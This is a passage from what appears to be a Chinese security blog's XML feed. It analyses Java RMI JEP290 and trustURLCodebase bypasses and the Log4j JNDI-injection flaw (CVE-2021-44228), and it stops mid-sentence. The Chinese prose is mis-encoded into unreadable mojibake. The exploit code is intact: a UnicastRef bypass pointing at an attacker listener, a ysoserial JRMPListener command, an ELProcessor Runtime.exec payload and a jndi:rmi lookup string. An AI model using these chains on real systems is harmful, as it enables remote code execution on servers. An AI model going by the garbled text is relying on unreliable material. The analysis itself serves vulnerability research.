ÂÖ≥‰∫éËøô‰∏™var1‰ΩúÁî®ÔºåÊü•‰∫ÜAdoptOpenJDKÁöÑÊ∫êÁ†ÅÂæóÁü•ÊòØJRMPÂçèËÆÆ‰∏≠ËøîÂõûÂÄºÁöÑÊ†áËÆ∞ÔºåÊ≠£Â∏∏ËøîÂõûÂÄº‰∏ç‰ºöËøõË°åÂèçÂ∫èÂàóÂåñ„ÄÇUnicastRefÁªïËøáJEP290‰ΩøÁî®ysoserial‰∏≠ÁöÑJRMPlistenerÔºåÂÖ∂Â∞ÜÊä•ÈîôËøîÂõûÊîπÊàêÂèçÂ∫èÂàóÂåñÁöÑpayloadÔºåÂÆûÁé∞ÂëΩ‰ª§ÊâßË°å„ÄÇ ÊúÄÂêéÊúçÂä°Á´ØÁöÑ‰ª£Á†ÅÂ¶Ç‰∏ãÔºåÁõ∏ÊØîÊ≠£Â∏∏ÁöÑÊµÅÁ®ãÂèØ‰ª•ÊéßÂà∂LiveRefÊåáÂêëÊÅ∂ÊÑèÁöÑÊúçÂä°Á´ØipÂíåÁ´ØÂè£„ÄÇ 1234567891011121314public class UnicastRefBypass &#123; public static void main(String[] args) throws Exception &#123; Registry reg = LocateRegistry.getRegistry("localhost", 1009); ObjID id = new ObjID(new Random().nextInt()); TCPEndpoint te = new TCPEndpoint("10.91.33.139", 3333); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); Registry proxy = (Registry) Proxy.newProxyInstance(UnicastRefBypass.class.getClassLoader(), new Class[]&#123; Registry.class &#125;, obj); reg.bind("UnicastRefBypass", proxy); &#125;&#125; UnicastRemoteObjectÁ±ªÁªïËøáÂú®8u231ÁöÑ‰øÆÂ§ç‰∏≠Ôºåsun.rmi.transport.DGCImpl_Stub#dirtyÊèêÂâç‰∏∫ËæìÂÖ•ÊµÅfilterÂ±ûÊÄßËÆæÁΩÆ‰∫ÜËøáÊª§Êé•Âè£ÊñπÊ≥ïÔºåÂú®ÂêéÁª≠sun.rmi.transport.StreamRemoteCall#executeCall‰∏≠ÂèàÊçïËé∑ËøáÊª§Êé•Âè£ÊñπÊ≥ïÊäõÂá∫ÁöÑInvalidClassExceptionÂºÇÂ∏∏ÔºåÊ∏ÖÁ©∫ËæìÂÖ•ÊµÅ‰∏≠incomingRefTableÂ±ûÊÄßÁöÑÂÄº„ÄÇÂâçËÄÖ‰ΩøÂæóÂà©Áî®UnicastRefÁ±ªÁªïËøáÊñπÂºèÂú®ÂèçÂ∫èÂàóÂåñExceptionËøîÂõûÂÄºÊó∂Êó†Ê≥ïÂèçÂ∫èÂàóÂåñ‰ªªÊÑèÁ±ª„ÄÇ ÂõΩÂ§ñÂÆâÂÖ®Á†îÁ©∂ÂëòAn TrinhÂú®8u231ÁâàÊú¨ÂèëÂ∏ÉÂâçÊèêÂá∫ÁöÑ‰∏ÄÁßçÁªïËøáÊñπÂºèÔºåÊ≤°Êúâ‰ΩøÁî®Ê≥®ÂÜåÊµÅÁ®ã‰∏≠Ê≥®ÂÜå‰∏≠ÂøÉÂèëËµ∑ËøûÊé•Âà∞ÊúçÂä°Á´ØÁöÑËæìÂÖ•ÊµÅÔºåËÄåÊòØÂà©Áî®Ê≥®ÂÜå‰∏≠ÂøÉÂú®ÂèçÂ∫èÂàóÂåñÊúçÂä°Á´ØÁªëÂÆöÁöÑÂØπË±°ËøáÁ®ã‰∏≠ÂèëËµ∑JRMPËØ∑Ê±ÇÔºåÂ∑ßÂ¶ôÂú∞ÁªïËøá‰∫ÜËøáÊª§„ÄÇ ÂÖà‰ªéÁõ¥Êé•ÂèçÂ∫èÂàóÂåñÊûÑÈÄ†ÁöÑÂØπË±°Êù•Â§çÁé∞‰∏ãËøô‰∏™POCÔºåÈ¶ñÂÖàÁî®ysoserialËµ∑‰∏Ä‰∏™JRMPListenerÁöÑexploit„ÄÇ 1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections6 &quot;calc&quot; ÁÑ∂ÂêéÂÜçÁé∞Âú®‰∏ãÈù¢ÁöÑPOCÂèçÂ∫èÂàóÂåñ„ÄÇ 123456789101112131415161718192021222324252627282930ObjID id = new ObjID(new Random().nextInt());TCPEndpoint te = new TCPEndpoint("127.0.0.1", 3333);UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance( RMIServerSocketFactory.class.getClassLoader(), new Class[]&#123;RMIServerSocketFactory.class, Remote.class&#125;, obj);Constructor constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);constructor.setAccessible(true);UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) constructor.newInstance(null);Field field = UnicastRemoteObject.class.getDeclaredField("ssf");field.setAccessible(true);field.set(unicastRemoteObject, serverSocketFactory);// Registry reg = LocateRegistry.getRegistry("localhost", 1009);// reg.bind("Exploit", unicastRemoteObject);ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);objectOutputStream.writeObject(unicastRemoteObject);byte[] result = byteArrayOutputStream.toByteArray();ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(result);ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);objectInputStream.readObject(); Ë∞ÉÁî®Ê†àÂæàÈïøÔºåÂÖà‰ªéjava.rmi.server.UnicastRemoteObject#reexportÊñπÊ≥ïÂºÄÂßã„ÄÇÂΩìcsfÊàñssfÂ±ûÊÄßÈùûÁ©∫Êó∂Ôºå‰ºöÁî®csfÂíåssfÂÆû‰æãÂåñ‰∏Ä‰∏™UnicastServerRef2ÂØπË±°ÔºåÂπ∂Ë∞ÉÁî®UnicastServerRef2Áà∂Á±ªUnicastServerRefÁöÑexportObjectÊñπÊ≥ï„ÄÇ UnicastServerRefÁöÑexportObjectÊñπÊ≥ïÂ∞±ÊòØÂÆûÁé∞ÁõëÂê¨Á´ØÂè£ÁöÑÊìç‰Ωú„ÄÇÂêéÁª≠Á≤æÂΩ©ÁöÑÈÉ®ÂàÜÊù•‰∫ÜÔºåÁõëÂê¨Á´ØÂè£ÁöÑÊìç‰Ωú‰ºöË∞ÉÁî®sun.rmi.transport.tcp.TCPEndpoint#newServerSocketÊñπÊ≥ïÔºåÂÖ∂‰∏≠‰ºöË∞ÉÁî®ÂÆÉÁöÑssfÂ±ûÊÄßÁöÑÊñπÊ≥ïÔºåËøô‰∏™ssfÂ±ûÊÄß‰∏éÂâçÈù¢UnicastRemoteObjectÂØπË±°ÁöÑssfÂ±ûÊÄß‰∏ÄËá¥ÔºåÊòØÂ∞ÅË£ÖRemoteObjectInvocationHandlerÁöÑ‰ª£ÁêÜÁ±ªÂØπË±°„ÄÇÁî±‰∫é‰ª£ÁêÜÁ±ªÁöÑÁâπÊÄßÔºå‰ºöÂÖàË∞ÉÁî®RemoteObjectInvocationHandlerÁ±ªÁöÑinvokeÊñπÊ≥ï„ÄÇÂÜçÂêéÈù¢ÁöÑË∞ÉÁî®Ê†à‰∏éÂÆ¢Êà∑Á´ØË∞ÉÁî®ËøúÁ®ãÊñπÊ≥ïÁöÑË∞ÉÁî®Ê†à‰∏ÄËá¥Ôºå‰πüÂ∞±ÊòØÂéüÊú¨ÁöÑÊ≥®ÂÜå‰∏≠ÂøÉÂèòÊàê‰∫ÜÂÆ¢Êà∑Á´ØÔºåÁî±‰∫éÂÆ¢Êà∑Á´ØÊ≤°ÊúâÂêØÂä®JEP290ËÆæÁΩÆÔºå‰πüÂ∞±ÁªïËøá‰∫ÜÊ≥®ÂÜå‰∏≠ÂøÉÁöÑJEP290ÈôêÂà∂„ÄÇ ÂçïÂú®ÂÆûÈôÖÊ≥®ÂÜåÁªëÂÆöÁöÑËøáÁ®ã‰∏≠ÔºåÊûÑÈÄ†ÁöÑÁ±ª‰ºöÂú®RegistryImpl_StubÁöÑbindÊñπÊ≥ï‰∏≠ÔºåÂ∫èÂàóÂåñÁ±ªÁöÑËæìÂá∫ÊµÅConnectionOutputStreamÁöÑÁà∂Á±ªMarshalOutputStreamÁöÑenableReplaceÂ±ûÊÄßÊ∞∏‰∏∫trueÔºå‰ª£ÁêÜÁ±ªË¢´ÊõøÊç¢‰∏∫UnicastRefÈÄ†ÊàêÂà©Áî®ÈìæË¢´Á†¥ÂùèÔºåÊâÄ‰ª•ÂÆûÈôÖÂà©Áî®‰∏≠Ë¶ÅÊÉ≥ÂäûÊ≥ïÂ∞ÜenableReplaceÂÄºÊîπ‰∏∫false„ÄÇysomap‰∏≠ÊúâÂÆûÁé∞ÊñπÊ≥ïÔºåÊÑüÂÖ¥Ë∂£ÂèØÊúâÁúã‰∏ÄÁúã„ÄÇ trustURLCodebaseÁªïËøáÈô§‰∫Ü‰ª•‰∏äÊ≥®ÂÜå‰∏≠ÂøÉJEP290ÁöÑÈôêÂà∂‰πãÂ§ñÔºåRMI‰∏≠ÊúçÂä°Á´ØÂØπÂÆ¢Êà∑Á´ØÁöÑÊîªÂáªÔºöJNDIÊ≥®ÂÖ•Ôºå‰ΩøÁî®rmiÂíåldapÂçèËÆÆÂä†ËΩΩÂ§ñÈÉ®Â∑•ÂéÇÁ±ª‰πüÂÖàÂêéÂèóÂà∞trustURLCodebaseÁöÑÈôêÂà∂ÔºåÂè™ËÉΩ‰ªéÊú¨Âú∞Â∑•ÂéÇÁ±ªÂÆû‰æãÂåñÂØπË±°„ÄÇ Êú¨Âú∞Â∑•ÂéÇÁ±ªÁªïËøá‰ΩøÁî®Êú¨Âú∞Â∑•ÂéÇÁ±ªËøõË°åJNDIÊ≥®ÂÖ•ÂíåRMIÂçèËÆÆËøúÁ®ãÂä†ËΩΩÊÅ∂ÊÑèÁ±ªÁöÑJNDIÊ≥®ÂÖ•ÂºÄÂ§¥ÁöÑË∞ÉÁî®Ê†àÂü∫Êú¨Áõ∏‰ººÔºåÊØïÁ´ü‰∏§ËÄÖÈÉΩÊòØÂü∫‰∫éRMIÂçèËÆÆÁöÑÔºå‰ΩÜÂú®javax.naming.spi.NamingManager#getObjectInstanceËøôÈáåÂºÄÂßãÂ∞±ÊúâÊâÄ‰∏çÂêå„ÄÇÂú®Ë∞ÉÁî®getObjectFactoryFromReferenceÊñπÊ≥ïÊó∂ËøîÂõûÁöÑÊòØÊú¨Âú∞Ê≠£Â∏∏ÁöÑÂ∑•ÂéÇÁ±ªÔºåËøô‰∏™Â∑•ÂéÇÁ±ªÊòØObjectFactoryÁöÑÂÆûÁé∞Á±ªÊàñ‰ªñÁöÑÂ≠êÁ±ªÔºåÁÑ∂ÂêéË∞ÉÁî®Â∑•ÂéÇÁ±ªÁöÑgetObjectInstanceÊñπÊ≥ï„ÄÇ Áé∞Âú®ÊØîËæÉÈÄöÁî®ÁöÑObjectFactoryÂÆûÁé∞Á±ªÊòØBeanFactoryÔºå‰ªñÁöÑgetObjectInstanceÊñπÊ≥ï‰ºö‰ªéResourceRefÂØπË±°ÁöÑclassNameÂ±ûÊÄßËé∑ÂèñÁ±ªÂêçÂπ∂ÂÆû‰æãÂåñÔºåÁÑ∂Âêé‰ªéforceStringÁöÑStringÂºïÁî®Âú∞ÂùÄ‰ª•=Âè∑ÂàÜÂâ≤Ëé∑ÂèñÂèÇÊï∞ÂêçÂíåsetterÊñπÊ≥ïÂêçÔºåÂπ∂ÂèçÂ∞ÑËé∑ÂèñËøô‰∏™setterÂèÇÊï∞‰∏∫StringÁöÑÊñπÊ≥ïÔºåÊúÄÂêéËé∑ÂèñÂèÇÊï∞ÂêçÁöÑStringÂºïÁî®Âú∞ÂùÄÂÜÖÂÜÖÂÆπÔºåÁî®ÂÆû‰æãÂåñÁöÑÂØπË±°Ë∞ÉÁî®Ëøô‰∏™setterÊñπÊ≥ï„ÄÇ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?,?&gt; environment) throws NamingException &#123; if (obj instanceof ResourceRef) &#123; try &#123; Reference ref = (Reference) obj; String beanClassName = ref.getClassName(); Class&lt;?&gt; beanClass = null; ClassLoader tcl = Thread.currentThread().getContextClassLoader(); if (tcl != null) &#123; try &#123; beanClass = tcl.loadClass(beanClassName); &#125; catch(ClassNotFoundException e) &#123; &#125; &#125; else &#123; try &#123; beanClass = Class.forName(beanClassName); &#125; catch(ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125; if (beanClass == null) &#123; throw new NamingException ("Class not found: " + beanClassName); &#125; ... Object bean = beanClass.getConstructor().newInstance(); /* Look for properties with explicitly configured setter */ RefAddr ra = ref.get("forceString"); Map&lt;String, Method&gt; forced = new HashMap&lt;&gt;(); String value; if (ra != null) &#123; value = (String)ra.getContent(); Class&lt;?&gt; paramTypes[] = new Class[1]; paramTypes[0] = String.class; String setterName; int index; /* Items are given as comma separated list */ for (String param: value.split(",")) &#123; param = param.trim(); /* A single item can either be of the form name=method * or just a property name (and we will use a standard * setter) */ index = param.indexOf('='); if (index &gt;= 0) &#123; setterName = param.substring(index + 1).trim(); param = param.substring(0, index).trim(); &#125; else &#123; ... &#125; try &#123; forced.put(param, beanClass.getMethod(setterName, paramTypes)); &#125; catch (NoSuchMethodException|SecurityException ex) &#123; ... &#125; &#125; &#125; Enumeration&lt;RefAddr&gt; e = ref.getAll(); while (e.hasMoreElements()) &#123; ra = e.nextElement(); String propName = ra.getType(); if (propName.equals(Constants.FACTORY) || propName.equals("scope") || propName.equals("auth") || propName.equals("forceString") || propName.equals("singleton")) &#123; continue; &#125; value = (String)ra.getContent(); Object[] valueArray = new Object[1]; /* Shortcut for properties with explicitly configured setter */ Method method = forced.get(propName); if (method != null) &#123; valueArray[0] = value; try &#123; method.invoke(bean, valueArray); &#125; catch (...) &#123; ... &#125; continue; &#125; ... &#125; return bean; &#125; catch (java.beans.IntrospectionException ie) &#123; ... &#125; &#125; else &#123; return null; &#125;&#125; ÁªìÂêà‰ª•‰∏ägetObjectInstance‰ª£Á†ÅÈÄªËæëÔºåË¢´ÂèçÂ∞ÑÁöÑÁ±ªÈúÄË¶ÅÁ¨¶Âêà‰ª•‰∏ãÊù°‰ª∂ÊâçÂèØË¢´Âà©Áî®: ÂÖ∑Êúâ‰∏Ä‰∏™Êó†ÂèÇÂÖ¨ÊúâÊûÑÈÄ†ÊñπÊ≥ï ÂÖ∑Êúâ‰∏Ä‰∏™ÂÖ¨Êúâ„ÄÅÂèÇÊï∞‰∏∫StringÁ±ªÂûãÁöÑÊñπÊ≥ï ‰∏Ä‰∫õ‰ΩøÁî®‰∫Ütomcat-embed-el‰æùËµñÁöÑÈ°πÁõÆÔºåÊàñËÄÖÈÉ®ÂàÜtomcatÂíåspringÁöÑÁâàÊú¨‰∏ãÂÖ∑ÊúâÁöÑjavax.el.ELProcessorÁ±ªÂíå‰ªñÁöÑevalÊñπÊ≥ïÁ¨¶ÂêàËøô‰∫õÊù°‰ª∂ÔºåÊúÄÁªàÊûÑÈÄ†Âá∫Áî®‰∫éÁªëÂÆöÁöÑRemoteÂØπË±°Â¶Ç‰∏ãÔºö 1234ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String) null, "", "", true, "org.apache.naming.factory.BeanFactory", (String) null);resourceRef.add(new StringRefAddr("forceString", "a=eval"));resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"calc\")"));ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef); ÂèÇËÄÉhttps://mp.weixin.qq.com/s/AG0OfLfQWW-winIWiOtwLQ https://su18.org/post/rmi-attack/ http://pipinstall.cn/2021/05/31/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ https://xz.aliyun.com/t/7932 https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1 https://www.anquanke.com/post/id/263726 https://tttang.com/archive/1405/ https://mp.weixin.qq.com/s/gBuKDjRfnbJDv6TG5F6q3w]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>ÂèçÂ∫èÂàóÂåñ</tag>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[log4jÊºèÊ¥ûÂàÜÊûê]]></title>
    <url>%2F2021%2F12%2F16%2Flog4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä2021 Âπ¥ 12 Êúà 10 Êó•ÔºåApacheÂèëÂ∏É‰∫ÜÂÖ∂ Log4j Ê°ÜÊû∂ÁöÑ 2.15.0 ÁâàÔºåÂÖ∂‰∏≠ÂåÖÊã¨ÂØπ CVE-2021-44228 ÁöÑ‰øÆÂ§çÔºåËøôÊòØ‰∏Ä‰∏™ÂΩ±Âìç Apache Log4j 2.14.1 ÂèäÊõ¥Êó©ÁâàÊú¨ÁöÑÂÖ≥ÈîÆ (CVSSv3 10) ËøúÁ®ã‰ª£Á†ÅÊâßË°å (RCE) ÊºèÊ¥û„ÄÇËØ•ÊºèÊ¥ûÂ≠òÂú®‰∫é Log4j Â§ÑÁêÜÂô®Â§ÑÁêÜÁâπÂà∂Êó•ÂøóÊ∂àÊÅØÁöÑÊñπÂºè‰∏≠„ÄÇ‰∏çÂèØ‰ø°ÁöÑÂ≠óÁ¨¶‰∏≤Ôºà‰æãÂ¶ÇÔºåÊù•Ëá™ËæìÂÖ•ÊñáÊú¨Â≠óÊÆµÁöÑÂ≠óÁ¨¶‰∏≤Ôºå‰æãÂ¶Ç Web Â∫îÁî®Á®ãÂ∫èÊêúÁ¥¢Ê°ÜÔºâÂåÖÂê´ÁöÑÂÜÖÂÆπ${jndi:ldap://example.com/a}ÔºåÂ¶ÇÊûúÂêØÁî®‰∫ÜÊ∂àÊÅØÊü•ÊâæÊõøÊç¢ÔºåÂ∞ÜËß¶ÂèëËøúÁ®ãÁ±ªÂä†ËΩΩ„ÄÅÊ∂àÊÅØÊü•ÊâæÂíåÁõ∏ÂÖ≥ÂÜÖÂÆπÁöÑÊâßË°å„ÄÇÊàêÂäüÂà©Áî® CVE-2021-44228 ÂèØ‰ª•ËÆ©Êú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑËøúÁ®ãÊîªÂáªËÄÖÂÆåÂÖ®ÊéßÂà∂ÊòìÂèóÊîªÂáªÁöÑÁõÆÊ†áÁ≥ªÁªü„ÄÇ ÁÆÄ‰ªãLog4jÊòØApacheÁöÑ‰∏Ä‰∏™ÂºÄÊ∫êÈ°πÁõÆÔºåÈÄöËøá‰ΩøÁî®Log4jÔºåÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂Êó•Âøó‰ø°ÊÅØËæìÈÄÅÁöÑÁõÆÁöÑÂú∞ÊòØÊéßÂà∂Âè∞„ÄÅÊñá‰ª∂„ÄÅGUIÁªÑ‰ª∂ÔºåÁîöËá≥ÊòØÂ•óÊé•Âè£ÊúçÂä°Âô®„ÄÅNTÁöÑ‰∫ã‰ª∂ËÆ∞ÂΩïÂô®„ÄÅUNIX SyslogÂÆàÊä§ËøõÁ®ãÁ≠âÔºõÊàë‰ª¨‰πüÂèØ‰ª•ÊéßÂà∂ÊØè‰∏ÄÊù°Êó•ÂøóÁöÑËæìÂá∫Ê†ºÂºèÔºõÈÄöËøáÂÆö‰πâÊØè‰∏ÄÊù°Êó•Âøó‰ø°ÊÅØÁöÑÁ∫ßÂà´ÔºåÊàë‰ª¨ËÉΩÂ§üÊõ¥Âä†ÁªÜËá¥Âú∞ÊéßÂà∂Êó•ÂøóÁöÑÁîüÊàêËøáÁ®ã„ÄÇ LookupÊèê‰æõ‰∫Ü‰∏ÄÁßçÂú®‰ªªÊÑè‰ΩçÁΩÆÂêë Log4j ÈÖçÁΩÆÊ∑ªÂä†ÂÄºÁöÑÊñπÊ≥ï„ÄÇÂÆÉ‰ª¨ÊòØÂÆûÁé∞StrLookupÊé•Âè£ÁöÑÁâπÂÆöÁ±ªÂûãÁöÑÊèí‰ª∂„ÄÇLookupËØ≠Ê≥ï‰∏∫${prefix:name}ÔºåÂÖ∂‰∏≠ÂâçÁºÄÊ†áËØÜÂëäËØâLog4jÂ∫îÂú®ÁâπÂÆö‰∏ä‰∏ãÊñá‰∏≠‰ΩøÁî®ÁöÑÂèòÈáèÂêçÁß∞„ÄÇ ÂâçÁºÄ ‰∏ä‰∏ãÊñá bundle ËµÑÊ∫êÊùü„ÄÇÊ†ºÂºè‰∏∫bundle:BundleName:BundleKey„ÄÇÊçÜÁªëÂåÖÂêçÁß∞ÈÅµÂæ™ÂåÖÂëΩÂêçÁ∫¶ÂÆöÔºåÂ¶ÇÔºö {bundle:com.domain.Messages:MyKey}„ÄÇ ctx Á∫øÁ®ã‰∏ä‰∏ãÊñáÊò†Â∞ÑÔºàMDCÔºâ„ÄÇ date ‰ΩøÁî®ÊåáÂÆöÁöÑÊ†ºÂºèÊèíÂÖ•ÂΩìÂâçÊó•ÊúüÂíå/ÊàñÊó∂Èó¥„ÄÇ env Á≥ªÁªüÁéØÂ¢ÉÂèòÈáè„ÄÇ jndi Âú®ÈªòËÆ§ÁöÑJNDI‰∏ä‰∏ãÊñá‰∏≠ËÆæÁΩÆÁöÑÂÄº„ÄÇ jvmrunargs ÈÄöËøáJMXËÆøÈóÆÁöÑJVMËæìÂÖ•ÂèÇÊï∞Ôºå‰ΩÜ‰∏çÊòØ‰∏ªË¶ÅÂèÇÊï∞; ËØ∑ÂèÇÈòÖRuntimeMXBean.getInputArgumentsÂú®Android‰∏ä‰∏çÂèØÁî® log4j Log4jÈÖçÁΩÆÂ±ûÊÄß„ÄÇË°®ËææÂºèlog4j:configLocationÂíålog4j:configLocationÂíå{log4j:configParentLocation}ÂàÜÂà´Êèê‰æõÁªôlog4jÁöÑÈÖçÁΩÆÊñá‰ª∂ÂíåÂÆÉÁöÑÁà∂Êñá‰ª∂Â§πÁöÑÁªùÂØπË∑ØÂæÑ„ÄÇ main ‰ΩøÁî® MapLookup.setMainArguments(String[])ËÆæÁΩÆÁöÑÂÄº„ÄÇ map Êù•Ëá™MapMessageÁöÑÂÄº„ÄÇ sd Êù•Ëá™StructuredDataMessageÁöÑÂÄº„ÄÇ‚Äúid‚ÄùÂ∞ÜËøîÂõûÊ≤°Êúâ‰ºÅ‰∏öÂè∑ÁöÑStructuredDataIdÁöÑÂêçÁß∞„ÄÇ‚Äútype‚ÄùÂ∞ÜËøîÂõûÊ∂àÊÅØÁ±ªÂûã„ÄÇÂÖ∂‰ªñÈîÆÂ∞Ü‰ªéMap‰∏≠ÂèñÂõûÂçï‰∏™ÂÖÉÁ¥†„ÄÇ sys Á≥ªÁªüÂ±ûÊÄß„ÄÇ ÊºèÊ¥ûÂàÜÊûêÊºèÊ¥ûËß¶ÂèëÈÄâÁî®log4j-core 2.14.1ÁâàÊú¨Ôºå‰ΩøÁî®‰ª•‰∏ã‰ª£Á†Å‰Ωú‰∏∫demo„ÄÇÂêØÂä®‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑRMIÊàñLDAPÊúçÂä°ÔºåÊâßË°ådemoÂç≥ÂèØËß¶Âèë„ÄÇ 1234567891011import org.apache.logging.log4j.Logger;import org.apache.logging.log4j.LogManager;public class Log4jJNDI &#123; private static final Logger logger = LogManager.getLogger(Log4jJNDI.class); public static void main(String[] args) &#123; System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true"); System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true"); logger.error("$&#123;jndi:rmi://127.0.0.1:8888/Calc&#125;"); &#125;&#125; ‰ª£Á†ÅÂàÜÊûêË∑üËøõÂà∞org.apache.logging.log4j.core.pattern.MessagePatternConverter#formatÔºåËã•Êú™ËÆæÁΩÆnolookup‰∏∫trueÔºåÈÅçÂéÜË¶ÅËæìÂá∫ÁöÑÊó•ÂøóÔºå$Á¨¶Âè∑Âíå{Á¨¶Âè∑Áõ∏ÁªßÂá∫Áé∞Âàô‰ºöÂú®ÂêéÁª≠Â∞ÜËä±Êã¨Âè∑‰∏≠ÁöÑÂÜÖÂÆπ‰ΩúÂ§ÑÁêÜ„ÄÇnolookupÂú®log4j 2.15.0‰πãÂâçÊòØÈªòËÆ§ÂÖ≥Èó≠ÁöÑ„ÄÇ ÂÜçË∑üËøõÂà∞org.apache.logging.log4j.core.lookup.StrSubstitutor#substituteÔºåÂú®ËøôÈáå‰ºö‰ªéÂ§ñÂà∞ÂÜÖÈÄíÂΩí${Âíå}ÂÜÖÁöÑÂÜÖÂÆπÔºåÁÑ∂Âêé‰ΩøÁî®ÈÄö‰∫Ü‰∏≠ÁöÑresolveVariableÊñπÊ≥ïËß£ÊûêÂπ∂ËøîÂõûÂÆÉÁöÑÂÄº„ÄÇ Âú®resolveVariableÊñπÊ≥ïÈáåÊîØÊåÅËß£ÊûêÁöÑÂâçÁºÄÊúâdate, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4jÔºåÂÆûÊµãÂú®SpringÊ°ÜÊû∂‰∏ãÊîØÊåÅËß£ÊûêÁöÑÂâçÁºÄ‰ºöÊúâÊâÄ‰∏çÂêå„ÄÇ ÁªßÁª≠Ë∑üËøõorg.apache.logging.log4j.core.lookup.Interpolator#lookupÔºåÊ†πÊçÆÂâçÁºÄ‰ªéstrLookupMapÂ±ûÊÄß‰∏≠Ëé∑ÂèñÁõ∏Â∫îÁöÑLookupÁ±ªÂÆû‰æã„ÄÇËøôÈáåËé∑ÂèñÁöÑÊòØJndiLookupÁöÑÂÆû‰æãÔºåÂπ∂Ë∞ÉÁî®ËØ•ÂÆû‰æãÁöÑlookupÊñπÊ≥ï„ÄÇ JndiLookupÁöÑlookupÊñπÊ≥ïÈáåÔºåË∞ÉÁî®org.apache.logging.log4j.core.net.jndiManagerÁöÑgetDefaultManagerÈùôÊÄÅÊñπÊ≥ïÔºåËøîÂõûJndiManagerÂÆû‰æãÔºåÂÖ∂‰∏≠ÁöÑcontextÂ±ûÊÄßË¢´ËÆæÁΩÆ‰∏∫InitialContextÂØπË±°„ÄÇ ÁÑ∂ÂêéË∞ÉÁî®JndiManagerÂÆû‰æãÁöÑlookupÊñπÊ≥ïÔºåÂÆûÈôÖÂ∞±ÊòØÂÆÉÁöÑcontextÂ±ûÊÄßInitialContextÁöÑlookupÊñπÊ≥ïÔºåÂêéÁª≠ÊµÅÁ®ãÂ∞±Â¶ÇÂ∏∏ËßÑJNDIÊ≥®ÂÖ•ÔºåÂä†ËΩΩËøúÁ®ãÁöÑÊÅ∂ÊÑèÁ±ªÊâßË°åÂÖ∂‰∏≠ÁöÑÊÅ∂ÊÑè‰ª£Á†Å„ÄÇ RC1‰øÆÂ§çÁªïËøálog4jÂú®RC1‰∏≠ÂØπJNDIÊ≥®ÂÖ•ÈóÆÈ¢òÁöÑ‰øÆÂ§çÂ≠òÂú®‰∫égithubÁöÑcommitËÆ∞ÂΩïLOG4J2-3201‰∏≠„ÄÇÂú®JndiManagerÁ±ªÈáåÂØπÂèçÂ∫èÂàóÂåñÁöÑÁ±ªÂíåJNDIÊúçÂä°Âô®Âú∞ÂùÄÂÅö‰∫ÜÁôΩÂêçÂçïÊ†°È™å„ÄÇ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public synchronized &lt;T&gt; T lookup(final String name) throws NamingException &#123; try &#123; URI uri = new URI(name); if (uri.getScheme() != null) &#123; if (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) &#123; LOGGER.warn("Log4j JNDI does not allow protocol &#123;&#125;", uri.getScheme()); return null; &#125; if (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) &#123; if (!allowedHosts.contains(uri.getHost())) &#123; LOGGER.warn("Attempt to access ldap server not in allowed list"); return null; &#125; Attributes attributes = this.context.getAttributes(name); if (attributes != null) &#123; // In testing the "key" for attributes seems to be lowercase while the attribute id is // camelcase, but that may just be true for the test LDAP used here. This copies the Attributes // to a Map ignoring the "key" and using the Attribute's id as the key in the Map so it matches // the Java schema. Map&lt;String, Attribute&gt; attributeMap = new HashMap&lt;&gt;(); NamingEnumeration&lt;? extends Attribute&gt; enumeration = attributes.getAll(); while (enumeration.hasMore()) &#123; Attribute attribute = enumeration.next(); attributeMap.put(attribute.getID(), attribute); &#125; Attribute classNameAttr = attributeMap.get(CLASS_NAME); if (attributeMap.get(SERIALIZED_DATA) != null) &#123; if (classNameAttr != null) &#123; String className = classNameAttr.get().toString(); if (!allowedClasses.contains(className)) &#123; LOGGER.warn("Deserialization of &#123;&#125; is not allowed", className); return null; &#125; &#125; else &#123; LOGGER.warn("No class name provided for &#123;&#125;", name); return null; &#125; &#125; else if (attributeMap.get(REFERENCE_ADDRESS) != null || attributeMap.get(OBJECT_FACTORY) != null) &#123; LOGGER.warn("Referenceable class is not allowed for &#123;&#125;", name); return null; &#125; &#125; &#125; &#125; &#125; catch (URISyntaxException ex) &#123; // This is OK. &#125; return (T) this.context.lookup(name); &#125; ‰ΩÜËøô‰∏™‰øÆÂ§çÂ≠òÂú®ÈóÆÈ¢òÔºåÂ¶ÇÊûúnew 